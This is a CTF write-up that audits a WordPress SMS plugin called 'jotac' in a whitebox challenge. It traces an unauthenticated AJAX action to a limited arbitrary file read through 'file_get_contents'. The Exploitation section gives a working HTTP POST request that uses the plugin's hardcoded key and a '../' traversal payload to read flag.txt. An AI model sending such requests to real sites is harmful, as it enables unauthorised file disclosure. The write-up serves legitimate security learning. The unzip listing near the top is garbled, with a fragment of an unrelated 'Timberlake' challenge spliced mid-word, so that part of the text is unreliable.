# Texting Trouble

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 19 solves / 676 points
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

I just installed a plugin to automate sending SMS to my clients. That's a great plugin with many options, I don't think it could cause a security issue, right?

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

[http://100.25.255.51:9092/](http://100.25.255.51:9092/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922174637.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/Texting-Trouble/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Texting-Trouble)-[2024.09.22|17:47:22(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Texting-Trouble)-[2024.09.22|17:47:24(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
  inflating: .env                    
 extracting: challenge-custom/flag.txt  
   creating: challenge-custom/jotac/
  [..]
  inflating: docker-compose.yml      
  inflating: Do# Timberlake

## Background

I'm a front end designer that has some old backend experience. Wanted to put some of my skills to make a cool website that can work with templates. Still WIP but it is coming along nicely.

Note: fully whiteboxckerfile              
  inflating: Makefile                
```

After reading the source code a bit, this plugin, `jotac`, is kind of complex. Overall, this plugin is to automate SMS campaign, such as sending SMS messages to someone.

First off, what's our objective in this challenge? Where's the flag?

When we extracted the zip file, we can see that the flag file is in `challenge-custom/flag.txt`. Hmm... Maybe we need to **somehow read the flag file** or Remote Code Execution (RCE)? Let's find out!

Due to the complexity of this plugin, it's suggested that we should audit this plugin using the **[sources and sinks model](https://www.youtube.com/watch?v=ZaOtY4i5w_U)** to find vulnerabilities.

Whenever I review a relatively complex plugin, I'll first search for the high/critical severity sinks, such as file upload, OS command injection. Let's look at file upload sinks!

One of many sinks in file upload are PHP function [`move_uploaded_file`](https://www.php.net/manual/en/function.move-uploaded-file.php) and superglobal variable [`$_FILES`](https://www.php.net/manual/en/reserved.variables.files.php). If we search for those in the plugin, we can find method `process_upload_form` from class `JOTAC_Plugin_Options` uses them:

```php
final class JOTAC_Plugin_Options {
    [...]
    public function process_upload_form() {
        if (isset($_FILES['file'])) {
            // Get the file information
            $file = $_FILES['file'];
            $filename = $file['name'];
            $filetmp = $file['tmp_name'];
            
            $sanitized_filename = stripslashes($filename);
            
            $upload_dir = wp_upload_dir();
            $upload_path = $upload_dir['baseurl'];

            $moved = move_uploaded_file($filetmp, $upload_path . '/' . $sanitized_filename);
            [...]
        }   
    }
}
```

In here, if `$_FILES` has item `file`, it'll move the uploaded temporary file into the WordPress upload directory ([`wp_upload_dir()`](https://developer.wordpress.org/reference/functions/wp_upload_dir/)).

At the first glance, it doesn't have any file type validation. Maybe we can upload a PHP webshell into the upload directory? Well, no we can't.

In WordPress function [`wp_upload_dir()`](https://developer.wordpress.org/reference/functions/wp_upload_dir/), it returns an array of information about the upload directory. Usually the developer will use array item `basedir` to get the upload directory, such as path `wp-content/uploads/`. In this case, however, **`$upload_path` is the array item `baseurl`**, which is something like `http://localhost/wp-content/uploads/`.

Therefore, this method is **completely useless**, as it doesn't even move the uploaded temporary file into the WordPress upload directory.

Since reading the flag file is a possible solution for this challenge, we should find a **arbitrary file read vulnerability**. There are a lots of file read sinks, including but not limited to `file_get_contents`, `fread`, `fopen`.

After a quick searching, we find that method `send_message_callback` from class `JOTAC_Plugin_Messenger` has `file_get_contents` file read sink. Let's dive into it! However, it's worth noting that this method's logic is quite complex. So, bearing with me! 

First, it checks the POST parameter `key` is equal to variable `$key`, which is hardcoded in class `JOTAC_Plugin`. As well as checking whether if the parsed POST parameter `formdata` string's `jotac-plugin-messages['jot-message']` is empty or not:

`challenge-custom/jotac/jotac.php`:

```php
final class JOTAC_Plugin {
    [...]
    public function __construct () {
        [...]
        $this->key = '6AGmIzDZktwJCaQt';
        [...]
    }
}
```

`challenge-custom/jotac/classes/class-jotac-plugin-messenger.php`:

```php
final class JOTAC_Plugin_Messenger {
    [...]
    public function send_message_callback() {
        $error = 0;
         
        $formdata = $_POST['formdata'];
        parse_str($formdata, $output);
        $message     = sanitize_textarea_field($output['jotac-plugin-messages']['jot-message']);
        [...]
        $mess_attachment = sanitize_text_field($output['jotac-plugin-messages']['jot-attachment']);
        [...]
        $jotseckey = sanitize_text_field($_POST['sec']);
        
        if (empty($jotseckey) || JOTAC_Plugin()->key!==$jotseckey) {
            // Bail out
            die();       
        }
        if (empty($message)) {
            // Empty message
            $error = 3;       
        }
        
        if ($error == 0) {
            [...]
        }
        [...]
    } // end send_message_callback
}
```

After validating our POST parameters, it checks whether if `currentsmsprovider` from class `JOTAC_Plugin` exists or not. However, it's always existing because of the class `JOTAC_Plugin` constructor:

```php
final class JOTAC_Plugin_Messenger {
    public function send_message_callback() {
        [...]
        if ($error == 0) {
            if (JOTAC_Plugin()->currentsmsprovider) {
                [...]
            }
        }
        [...]
    } // end send_message_callback
}
```

```php
final class JOTAC_Plugin {
    [...]
    public function __construct () {
        [...]
        $this->smsproviders = $this->get_smsproviders();
        $this->currentsmsprovidername = 'twilio';
        [...]
        if ($this->currentsmsprovidername != 'default' && !empty($this->currentsmsprovidername)) {
            [...]
            $this->currentsmsprovider = JOTAC_Plugin_Smsprovider::instance();
        } else {
            [...]
        }
        [...]
    }
}
```

Then, if the parsed POST parameter `formdata` string has `jotac-plugin-messages['jot-attachment']`, it'll validate the URI scheme is start with something like `foo://`. It also validates whether if the file extension of `jot-attachment` is in the whitelist extensions or not:

```php
final class JOTAC_Plugin_Messenger {
    [...]
    public function send_message_callback() {
        [...]
        $formdata = $_POST['formdata'];
        parse_str($formdata, $output);
        [...]
        $mess_attachment = sanitize_text_field($output['jotac-plugin-messages']['jot-attachment']);
        [...]
        if ($error == 0) {
            if (JOTAC_Plugin()->currentsmsprovider) {
                [...]
                // Optional attachment
                if (!empty($mess_attachment)) {
                    if (preg_match('/^[a-zA-Z]+:\/\//', $mess_attachment)) {
                        $error = 6;
                        $additional_error = "Incorrect format";
                    }
                    $allowed_extensions = ['txt','png','jpg','pdf'];
                    if (!in_array(pathinfo($mess_attachment, PATHINFO_EXTENSION), $allowed_extensions)) {
                        $error = 6;
                        $additional_error = "Filetype not supported";
                    }
                    else {
                        [...]
                    }
                }
                [...]
            }
            [...]
        }
    } // end send_message_callback
}
```

If `jot-attachment` passes all the checks, it'll first check whether if the file exists in the WordPress upload directory (This time it's using `basedir` instead of `baseurl`). If the file exists, **it reads the file's content and stores it into variable `$attachment_raw`**:

```php
final class JOTAC_Plugin_Messenger {
    [...]
    public function send_message_callback() {
        [...]
        if ($error == 0) {
            if (JOTAC_Plugin()->currentsmsprovider) {
                [...]
                // Optional attachment
                if (!empty($mess_attachment)) {
                    [...]
                    if (!in_array(pathinfo($mess_attachment, PATHINFO_EXTENSION), $allowed_extensions)) {
                        [...]
                    }
                    else {
                        $wp_dir = wp_upload_dir();
                        $attachment_fp = $wp_dir['basedir'] . '/attachments/' . $mess_attachment;
                        $available_files = array_diff(scandir(dirname($attachment_fp)), array('.', '..'));
                        $existing_files = [];
                        foreach ($available_files as $f) {
                             $existing_files[] = $f;
                        }
                        
                        if (in_array(basename($attachment_fp), $existing_files)) {
                             $attachment_raw = file_get_contents($attachment_fp);
                        } else {
                             $error = 6;
                             $additional_error = "File does not exist among [".implode(', ', $existing_files)."]";
                        }
                    }
                }
                [...]
            }
            [...]
        }
    } // end send_message_callback
}
```

Hmm... Is there any way to read the contents of the attachment? Yes we can!

After validating and reading the file's content, if there's no error (`$error = 0;`), the file's content is not empty, and **POST parameter `level` is `verbose`**, the response will have the file's content. However, the output of the file is only 75 characters long:

```php
final class JOTAC_Plugin_Messenger {
    [...]
    public function send_message_callback() {
        [...]
        if ($error != 0 ) {
            [...]
        }
        else {
            if ($mess_attachment == '')
            {
                [...]
            }
            else {
                if ($_POST['level'] == 'verbose') {
                    $response = array('sent'=> "true", 'attachment'=> esc_html(substr($attachment_raw, 0, 75)), 'errorcode' => $error, 'send_errors'=>$all_send_errors );
            }
                else{
                    [...]
                }
            }
        }
        
        echo json_encode($response);
        
        die(); // this is required to terminate immediately and return a proper response
    } // end send_message_callback
}
```

To sum up, this method `send_message_callback` allows us to **read limited arbitrary files**, with files that have extension either `.txt`, `.png`, `.jpg`, or `.pdf`.

Hmm... Since **the flag file's extension is `.txt`**, we can leverage this vulnerability to read the flag file!

Alright, how can we call this method? Is there any AJAX action has this callback method?

Fortunately yes. There's an **unauthenticated** and authenticated AJAX action called **`send_message`** that uses this callback method:

```php
final class JOTAC_Plugin_Messenger {
    [...]
    function __construct() {
        add_action( 'wp_ajax_send_message', array( &$this, 'send_message_callback' ) );
        add_action( 'wp_ajax_nopriv_send_message', array( &$this, 'send_message_callback' ) );
        [...]
    } // end constructor
}
```

## Exploitation

Armed with above information, we can send the following HTTP POST request to get the flag!

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 100.25.255.51:9092
Content-Type: application/x-www-form-urlencoded
Content-Length: 198

action=send_message&sec=6AGmIzDZktwJCaQt&formdata=jotac-plugin-messages%5bjot-message%5d%3danything%26jotac-plugin-messages%5bjot-attachment%5d%3d..%2f..%2f..%2f..%2f..%2f..%2fflag.txt&level=verbose
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922215039.png)

- **Flag: `CTF{PSEUDOLIMITED_INCLUSION_0z471}`**

## Conclusion

What we've learned:

1. Limited arbitrary file read via PHP function `file_get_contents()`